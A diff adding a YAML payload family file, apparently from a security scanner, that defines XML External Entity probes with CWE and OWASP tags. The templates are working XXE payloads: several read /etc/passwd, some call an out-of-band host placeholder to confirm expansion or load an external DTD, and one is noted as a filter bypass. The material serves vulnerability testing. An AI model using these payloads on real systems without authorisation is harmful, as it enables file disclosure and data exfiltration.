@@ -1,0 +1,49 @@
+family_id: xxe
+description: >-
+  XML External Entity probes covering classic file-disclosure entities,
+  out-of-band exfiltration via SYSTEM URIs, and parameter-entity (XXE)
+  variants. Conservative read-only seeds; destructive variants must be
+  authored by the operator in a separate approved YAML.
+cwe_ids: [611, 776]
+owasp_top10:
+  - 'A05:2021'
+risk_level: medium
+requires_approval: false
+oast_required: true
+payloads:
+  - id: classic_file
+    template: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
+    confidence: likely
+    notes: Classic file-disclosure XXE; differential vs control file confirms read.
+  - id: oast_dns
+    template: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://{oast_host}/{canary}">]><r>&x;</r>'
+    confidence: confirmed
+    notes: Out-of-band DNS XXE; OAST callback confirms entity expansion.
+  - id: parameter_entity
+    template: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://{oast_host}/{canary}.dtd"> %x;]><r/>'
+    confidence: confirmed
+    notes: Parameter-entity XXE; loads an external DTD via OAST.
+  - id: utf16_bom
+    template: '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
+    confidence: suspected
+    notes: UTF-16 declaration; bypasses naive substring filters.
+  - id: cdata_wrapper
+    template: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r><![CDATA[&x;]]></r>'
+    confidence: suspected
+    notes: CDATA wrapper; tests parser disagreement on entity expansion.
+  - id: blind_oast_marker
+    template: '<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://{oast_host}/{canary}.dtd"><r/>'
+    confidence: confirmed
+    notes: External DOCTYPE blind-XXE; OAST callback confirms hit.
+mutations:
+  - name: case_flip
+    description: XML keywords are case-sensitive — flips produce known errors.
+  - name: whitespace_alt
+    description: Whitespace variants test parser robustness.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw XML payload.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded for query-string sinks.
